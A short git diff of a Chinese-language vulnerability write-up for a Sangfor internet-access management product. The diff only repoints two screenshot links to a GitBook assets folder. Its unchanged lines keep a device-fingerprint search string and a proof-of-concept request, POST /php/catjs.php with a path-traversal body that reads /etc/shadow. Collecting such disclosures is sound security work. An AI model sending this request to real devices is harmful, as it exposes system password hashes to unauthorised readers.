@@ -18,7 +18,7 @@ title=="SANGFOR上网优化管理"
 
 登陆页面
 
-![image-20230828111216211](images/image-20230828111216211.png)
+![image-20230828111216211](../.gitbook/assets/image-20230828111216211.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ POST /php/catjs.php
 ["../../../../../../etc/shadow"]
 ```
 
-![image-20230828111228485](images/image-20230828111228485.png)
+![image-20230828111228485](../.gitbook/assets/image-20230828111228485.png)
